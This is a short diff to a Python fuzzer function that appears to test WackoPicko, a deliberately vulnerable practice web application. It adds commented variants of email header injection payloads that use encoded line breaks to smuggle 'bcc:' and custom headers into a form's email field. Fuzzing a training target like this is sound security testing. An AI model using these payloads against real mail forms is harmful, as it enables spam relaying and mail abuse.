@@ -97,6 +97,9 @@ def fuzzer(reconstructed_form, form_id):
         data_3 = {}
         # add x-dummy-header too
         payload = 'nuser123@wackopicko.com%0abcc:maluser123@wackopicko.com%0ax-check:in'
+        # nuser123%0abcc%3amaluser123@wackopicko.com
+        # nuser123@wackopicko.com%0abcc%3amaluser123@wackopicko.com
+        # nuser123@wackopicko.com%0abcc:maluser123@wackopicko.com
         payload_2 = 'nuser123@wackopicko.com%0d%0abcc:maluser123@wackopicko.com%0d%0ax-check:in'
         payload_3 = 'reguser123@wackopicko.com'
 
